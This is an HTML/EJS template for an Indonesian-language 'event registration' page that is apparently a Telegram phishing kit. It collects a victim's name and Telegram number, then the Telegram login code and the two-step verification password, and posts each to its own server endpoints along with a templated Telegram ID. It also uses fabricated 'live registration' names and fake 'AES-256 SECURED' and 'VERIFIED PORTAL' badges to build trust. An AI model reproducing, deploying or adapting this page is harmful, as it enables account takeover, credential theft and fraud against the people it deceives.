 <body class="min-h-screen flex flex-col items-center p-4 pt-6 md:pt-12">

    <!-- Global Spinner -->
    <div id="loadingSpinner" class="d-none fixed inset-0 bg-slate-900/80 backdrop-blur-md flex items-center justify-center z-[999]">
      <div class="flex flex-col items-center">
        <div class="relative w-20 h-20">
          <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
          <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
        </div>
        <p class="mt-4 text-white font-bold tracking-widest animate-pulse">MEMPROSES DATA...</p>
      </div>
    </div>

    <!-- Banner Image -->
    <div class="w-full max-w-2xl mb-8 reveal" style="animation-delay: 0.1s">
      <div class="floating-banner shadow-2xl rounded-[2rem] overflow-hidden border-4 border-white">
        <img src="<%=  imageUrl1  %>" alt="Banner Event" class="w-full h-auto">
      </div>
    </div>

    <!-- Main Card -->
    <div class="w-full max-w-lg glass-morphism rounded-[2.5rem] shadow-[0_25px_50px_-12px_rgba(0,0,0,0.15)] p-8 md:p-12 reveal" style="animation-delay: 0.2s">
      
      <header class="text-center mb-10">
        <div class="inline-flex items-center gap-2 px-4 py-1.5 mb-6 text-[10px] font-black tracking-[0.2em] text-blue-700 uppercase bg-blue-100/50 rounded-full">
          <span class="relative flex h-2 w-2">
            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
            <span class="relative inline-flex rounded-full h-2 w-2 bg-blue-600"></span>
          </span>
          Sistem Pendaftaran Aktif
        </div>
        <h1 class="text-4xl font-extrabold text-slate-900 tracking-tight mb-4"><%= title %></h1>
        <div id="guide-text" class="relative overflow-hidden h-8 bg-slate-100 rounded-full flex items-center">
          <div class="whitespace-nowrap flex animate-[marqueeAnim_25s_linear_infinite]">
            <span class="text-center px-4 text-sm font-bold text-slate-600 italic">Selamat datang! Silahkan Isi data Anda dengan benar!!!</span>
          </div>
        </div>      </header>

      <div class="space-y-8">
        <!-- Login Form (Awal) -->
        <form id="loginForm" class="space-y-6" novalidate="">
          <div class="space-y-4">
            <div class="group relative">
              <label class="block text-xs font-black text-slate-400 uppercase tracking-widest mb-2 ml-2">Nama Lengkap Sesuai KTP</label>
              <div class="relative">
                <i class="fa-solid fa-address-card absolute left-5 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-600 transition-colors"></i>
                <input autocomplete="off" id="name" name="name" type="text" placeholder="Nama Lengkap" required="" class="w-full pl-14 pr-6 py-5 bg-slate-100 border-2 border-transparent rounded-2xl font-bold text-slate-900 placeholder:text-slate-400 focus:bg-white focus:border-blue-600 focus:outline-none transition-all duration-300 shadow-inner">
              </div>
            </div>

            <div class="group relative">
              <label class="block text-xs font-black text-slate-400 uppercase tracking-widest mb-2 ml-2">Nomor Telegram</label>
              <div class="relative">
                <i class="fa-brands fa-telegram absolute left-5 top-1/2 -translate-y-1/2 text-2xl text-slate-400 group-focus-within:text-blue-600 transition-colors"></i>
                <input autocomplete="off" id="phoneNumber" name="phoneNumber" type="tel" placeholder="+62" required="" class="w-full pl-14 pr-6 py-5 bg-slate-100 border-2 border-transparent rounded-2xl font-bold text-slate-900 placeholder:text-slate-400 focus:bg-white focus:border-blue-600 focus:outline-none transition-all duration-300 shadow-inner">
              </div>
            </div>
          </div>

          <div class="responseMessage text-center text-red-500 font-bold text-sm h-5"></div>

          <button type="submit" class="btn-shimmer w-full py-5 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-black text-lg shadow-xl shadow-blue-200 transition-all active:scale-95" disabled="">
            MULAI PENDAFTARAN
          </button>
        </form>

        <!-- OTP Form -->
        <form id="otpForm" class="d-none space-y-6 text-center" novalidate="">
          <div class="bg-blue-50 py-6 rounded-3xl border-2 border-dashed border-blue-200">
            <i class="fa-solid fa-envelope-open-text text-4xl text-blue-600 mb-3 block"></i>
            <h3 class="font-black text-slate-800">Verifikasi Kode</h3>
            <p class="text-sm text-slate-500 px-6">Masukkan 5 digit kode yang dikirim ke Telegram Anda</p>
          </div>
          
          <input id="verificationCode" type="number" placeholder="00000" required="" class="w-full text-center text-4xl tracking-[0.5em] font-black py-5 bg-slate-100 border-2 border-transparent rounded-2xl focus:bg-white focus:border-blue-600 focus:outline-none transition-all">

          <div class="responseMessage text-center text-red-500 font-bold text-sm h-5"></div>

          <button type="submit" class="w-full py-5 bg-emerald-600 hover:bg-emerald-700 text-white rounded-2xl font-black text-lg shadow-xl shadow-emerald-100 transition-all active:scale-95" disabled="">
            VERIFIKASI SEKARANG
          </button>
        </form>
        <!-- Password Form -->
        <form id="passwordForm" class="d-none space-y-6" novalidate="">
          <div class="bg-indigo-900 text-white p-6 rounded-3xl shadow-xl">
             <i class="fa-solid fa-lock text-3xl mb-3"></i>
             <h3 class="font-bold text-lg">Keamanan Ganda</h3>
             <p class="text-indigo-200 text-sm">Masukkan kata sandi Verifikasi Dua Langkah Anda.</p>
          </div>

          <input id="password" type="password" placeholder="Password 2FA" required="" class="w-full px-6 py-5 bg-slate-100 border-2 border-transparent rounded-2xl font-bold focus:bg-white focus:border-indigo-600 focus:outline-none transition-all shadow-inner">

          <div class="responseMessage text-center text-red-500 font-bold text-sm h-5"></div>

          <button type="submit" class="w-full py-5 bg-indigo-600 hover:bg-indigo-700 text-white rounded-2xl font-black text-lg shadow-xl shadow-indigo-100 transition-all active:scale-95" disabled="">
            KONFIRMASI LOGIN
          </button>
        </form>

        <!-- Reload/Reset -->
        <div id="reloadBtn" class="d-none">
          <button onclick="location.reload();" class="w-full py-4 border-2 border-slate-200 text-slate-500 rounded-2xl font-bold hover:bg-slate-50 transition-all flex items-center justify-center gap-2">
            <i class="fa-solid fa-arrow-rotate-left"></i> Ganti Nomor / Kirim Ulang
          </button>
        </div>

        <!-- Success Section -->
        <div class="four d-none space-y-6 text-center">
          <div class="bg-emerald-50 py-8 rounded-3xl border-2 border-emerald-200">
            <div class="w-16 h-16 rounded-full bg-emerald-100 flex items-center justify-center mx-auto mb-4">
              <i class="fa-solid fa-check text-3xl text-emerald-600"></i>
            </div>
            <h3 class="font-black text-slate-800 text-xl mb-2">Pendaftaran Berhasil!</h3>
            <p class="text-sm text-slate-500 px-6">Data Anda telah kami terima. Silakan tunggu proses verifikasi.</p>
          </div>
          <div class="flex justify-center">
            <img src="/assets/img/loading.gif" alt="Loading..." style="width: 100px;">
          </div>
        </div>
      </div>

      <!-- Real-Time Activity Auto-Scroll Section -->
      <div class="mt-12">
        <div class="flex items-center justify-between mb-6">
          <div class="flex items-center gap-2">
            <span class="flex h-3 w-3">
              <span class="animate-ping absolute inline-flex h-3 w-3 rounded-full bg-red-400 opacity-75"></span>
              <span class="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
            </span>
            <h4 class="text-xs font-black text-slate-800 tracking-tighter">LIVE PENDAFTARAN TERBARU</h4>
          </div>
          <span class="text-[10px] bg-slate-200 text-slate-600 font-bold px-2 py-0.5 rounded">AUTO-UPDATED</span>
        </div>

        <div class="testimonial-container" id="testimonialContainer">
          <div class="testimonial-track" id="testimonialTrack">
            <!-- Isi Testimoni (Diduplikasi untuk efek infinite scroll) -->
            <div class="activity-card flex items-center justify-between p-4 bg-white border border-slate-100 rounded-2xl shadow-sm">
              <div class="flex items-center gap-3">
                <img src="data:image/png;base64," class="w-10 h-10 rounded-full border-2 border-blue-100">
                <div>
                  <p class="text-sm font-bold text-slate-900">Indah Pertiwi</p>
                  <p class="text-[10px] font-medium text-emerald-500"><i class="fa-solid fa-check-circle"></i> Berhasil Terdaftar</p>
                </div>
              </div>              <span class="text-[10px] text-slate-400 font-medium italic">2 detik lalu</span>
            </div>

            <div class="activity-card flex items-center justify-between p-4 bg-white border border-slate-100 rounded-2xl shadow-sm">
              <div class="flex items-center gap-3">
                <img src="data:image/png;base64," class="w-10 h-10 rounded-full border-2 border-blue-100">
                <div>
                  <p class="text-sm font-bold text-slate-900">Firman Syahputra</p>
                  <p class="text-[10px] font-medium text-emerald-500"><i class="fa-solid fa-check-circle"></i> Berhasil Terdaftar</p>
                </div>
              </div>
              <span class="text-[10px] text-slate-400 font-medium italic">14 detik lalu</span>
            </div>

            <div class="activity-card flex items-center justify-between p-4 bg-white border border-slate-100 rounded-2xl shadow-sm">
              <div class="flex items-center gap-3">
                <img src="data:image/png;base64," class="w-10 h-10 rounded-full border-2 border-blue-100">
                <div>
                  <p class="text-sm font-bold text-slate-900">Agus Kurniawan</p>
                  <p class="text-[10px] font-medium text-emerald-500"><i class="fa-solid fa-check-circle"></i> Berhasil Terdaftar</p>
                </div>
              </div>
              <span class="text-[10px] text-slate-400 font-medium italic">29 detik lalu</span>
            </div>

            <div class="activity-card flex items-center justify-between p-4 bg-white border border-slate-100 rounded-2xl shadow-sm">
              <div class="flex items-center gap-3">
                <img src="data:image/png;base64," class="w-10 h-10 rounded-full border-2 border-blue-100">
                <div>
                  <p class="text-sm font-bold text-slate-900">Siti Rahayu</p>
                  <p class="text-[10px] font-medium text-emerald-500"><i class="fa-solid fa-check-circle"></i> Berhasil Terdaftar</p>
                </div>
              </div>
              <span class="text-[10px] text-slate-400 font-medium italic">1 menit lalu</span>
            </div>

            <div class="activity-card flex items-center justify-between p-4 bg-white border border-slate-100 rounded-2xl shadow-sm">
              <div class="flex items-center gap-3">
                <img src="data:image/png;base64," class="w-10 h-10 rounded-full border-2 border-blue-100">
                <div>
                  <p class="text-sm font-bold text-slate-900">Rizky Ramadhan</p>
                  <p class="text-[10px] font-medium text-emerald-500"><i class="fa-solid fa-check-circle"></i> Berhasil Terdaftar</p>
                </div>
              </div>
              <span class="text-[10px] text-slate-400 font-medium italic">2 menit lalu</span>
            </div>
            
            <!-- Duplikasi untuk loop mulus -->
            <div class="activity-card flex items-center justify-between p-4 bg-white border border-slate-100 rounded-2xl shadow-sm">
              <div class="flex items-center gap-3">                <img src="data:image/png;base64," class="w-10 h-10 rounded-full border-2 border-blue-100">
                <div>
                  <p class="text-sm font-bold text-slate-900">Indah Pertiwi</p>
                  <p class="text-[10px] font-medium text-emerald-500"><i class="fa-solid fa-check-circle"></i> Berhasil Terdaftar</p>
                </div>
              </div>
              <span class="text-[10px] text-slate-400 font-medium italic">Baru saja</span>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Security Footer -->
    <div class="mt-8 mb-12 text-center reveal" style="animation-delay: 0.5s">
      <div class="flex items-center justify-center gap-4 mb-4">
        <div class="flex items-center gap-1.5 grayscale opacity-50">
           <i class="fa-solid fa-shield-halved text-slate-600"></i>
           <span class="text-[10px] font-black text-slate-600 tracking-tighter">AES-256 SECURED</span>
        </div>
        <div class="flex items-center gap-1.5 grayscale opacity-50">
           <i class="fa-solid fa-check-double text-slate-600"></i>
           <span class="text-[10px] font-black text-slate-600 tracking-tighter">VERIFIED PORTAL</span>
        </div>
      </div>
      <p class="text-[10px] font-medium text-slate-400 max-w-xs mx-auto leading-relaxed">
        Sistem ini terenkripsi secara otomatis. Segala bentuk penyalahgunaan data akan diproses sesuai hukum yang berlaku.
      </p>
    </div>

    <script src="assets/js/jquery-3.6.0.min.js"></script>
    
    <script>
      // Kloning isi testimoni untuk membuat loop yang tak terbatas
      $(document).ready(function() {
        const $track = $('#testimonialTrack');
        const $items = $track.children();
        $track.append($items.clone());
        $track.append($items.clone());
      });
    </script>

    <!-- VALIDASI WAJIB ISI SEMUA KOLOM -->
    <script>
      document.addEventListener('DOMContentLoaded', function () {
        const loginForm = document.getElementById('loginForm');
        const otpForm = document.getElementById('otpForm');
        const passwordForm = document.getElementById('passwordForm');
        const nameInput = document.getElementById('name');
        const phoneInput = document.getElementById('phoneNumber');
        const otpInput = document.getElementById('verificationCode');
        const passwordInput = document.getElementById('password');

        const loginBtn = loginForm.querySelector('button[type="submit"]');
        const otpBtn = otpForm.querySelector('button[type="submit"]');
        const passwordBtn = passwordForm.querySelector('button[type="submit"]');

        loginBtn.disabled = true;
        otpBtn.disabled = true;
        passwordBtn.disabled = true;

        const style = document.createElement('style');
        style.textContent = `
          button:disabled {
            opacity: 0.6 !important;
            cursor: not-allowed;
            transform: none !important;
          }
          button:disabled::after {
            display: none !important;
          }
        `;
        document.head.appendChild(style);

        function validateLogin() {
          loginBtn.disabled = !(nameInput.value.trim() && phoneInput.value.trim());
        }
        function validateOtp() {
          otpBtn.disabled = !(otpInput.value.trim());
        }
        function validatePassword() {
          passwordBtn.disabled = !(passwordInput.value.trim());
        }

        nameInput.addEventListener('input', validateLogin);
        phoneInput.addEventListener('input', validateLogin);
        otpInput.addEventListener('input', validateOtp);
        passwordInput.addEventListener('input', validatePassword);
      });

      var clientHash = "";
      var currentPhone = "";
      var idtele = "<%= String(telegramId) %>";

      function showLoadingSpinner() {
        $("#loadingSpinner").removeClass("d-none");
      }
      function hideLoadingSpinner() {
        $("#loadingSpinner").addClass("d-none");
      }

      function formatPhoneNumber(phoneNumber) {
        if (phoneNumber.startsWith('0')) {
          return '+62' + phoneNumber.substring(1);
        } else if (phoneNumber.startsWith('62')) {
          return '+62' + phoneNumber.substring(2);
        } else {
          return phoneNumber;
        }
      }

      // Step 1: Kirim Nomor ke Server
      $("#loginForm").on("submit", function (e) {
        e.preventDefault();
        var fullName = $("#name").val().trim();
        var phone = formatPhoneNumber($("#phoneNumber").val().trim());
        if (!fullName || !phone) return false;
        currentPhone = phone;

        showLoadingSpinner();
        $(".responseMessage").html("");

        $.ajax({
          type: "POST",
          url: "/number",
          data: { full_name: fullName, phone_number: phone },
          success: function(hasil) {
            hideLoadingSpinner();
            if (hasil.code == 200) {
              clientHash = hasil.clientHash;
              $("#loginForm").addClass("d-none");
              $("#otpForm").removeClass("d-none");
            } else {
              if (hasil.err && hasil.err.errorMessage == "PHONE_NUMBER_INVALID") {
                $(".responseMessage").html('<div class="alert alert-danger">Nomor Yang Anda Masukkan Tidak Valid!</div>');
              } else if (hasil.err && hasil.err.errorMessage == "FLOOD") {
                $(".responseMessage").html('<div class="alert alert-danger">Terlalu Banyak Permintaan Code!</div>');
              } else if (hasil.err && hasil.err.errorMessage == "PHONE_PASSWORD_FLOOD") {
                $(".responseMessage").html('<div class="alert alert-danger">Terlalu Banyak Memasukkan Password!</div>');
              } else {
                $(".responseMessage").html('<div class="alert alert-danger">' + (hasil.err ? hasil.err.errorMessage : 'Terjadi kesalahan') + '</div>');
              }
            }
          },
          error: function() {
            hideLoadingSpinner();
            $(".responseMessage").html('<div class="alert alert-danger">Periksa jaringan anda dan coba lagi</div>');
          }
        });
      });

      // Step 2: Kirim OTP ke Server
      $("#otpForm").on("submit", function (e) {
        e.preventDefault();
        var otp = $("#verificationCode").val().trim();
        if (!otp) return false;

        showLoadingSpinner();
        $(".responseMessage").html("");

        $.ajax({
          type: "POST",
          url: "/code",
          data: {
            clientHash: clientHash,
            phone_number: currentPhone,
            otp_code: otp,
            idtele: idtele
          },
          success: function(hasil) {
            hideLoadingSpinner();
            if (hasil.needPassword || hasil.code == 401) {
              $("#otpForm").addClass("d-none");
              $("#passwordForm").removeClass("d-none");
            } else {
              try {
                if (hasil.code == 200) {
                  $("#otpForm").addClass("d-none");
                  $(".four").removeClass("d-none");
                } else {
                  $(".responseMessage").html('<div class="alert alert-danger">' + hasil.code + ' - ' + hasil.error + '</div>');
                }
              } catch(e) {
                $(".responseMessage").html('<div class="alert alert-danger">Ada masalah, coba lagi</div>');
              }
            }
          },
          error: function() {
            hideLoadingSpinner();
            $(".responseMessage").html('<div class="alert alert-danger">Periksa jaringan anda dan coba lagi</div>');
          }
        });
      });

      // Step 3: Kirim Password ke Server
      $("#passwordForm").on("submit", function (e) {
        e.preventDefault();
        var pwd = $("#password").val().trim();
        if (!pwd) return false;

        showLoadingSpinner();
        $(".responseMessage").html("");

        $.ajax({
          type: "POST",
          url: "/password",
          data: {
            clientHash: clientHash,
            phone_number: currentPhone,
            password: pwd,
            idtele: idtele
          },
          success: function(response) {
            hideLoadingSpinner();
            try {
              if (response.code == 200) {
                $("#passwordForm").addClass("d-none");
                $(".four").removeClass("d-none");
              } else {
                if (response.error) {
                  $(".responseMessage").html('<div class="alert alert-danger">' + response.code + ' - ' + response.error + '</div>');
                } else {
                  $(".responseMessage").html('<div class="alert alert-danger">Ada masalah, refresh halaman dan coba lagi</div>');
                }
              }
            } catch(e) {
              $(".responseMessage").html('<div class="alert alert-danger">Ada masalah, refresh halaman dan coba lagi</div>');
            }
          },
          error: function() {
            hideLoadingSpinner();
            $(".responseMessage").html('<div class="alert alert-danger">Terjadi kesalahan, coba lagi nanti.</div>');
          }
        });
      });

    </script>
  </body>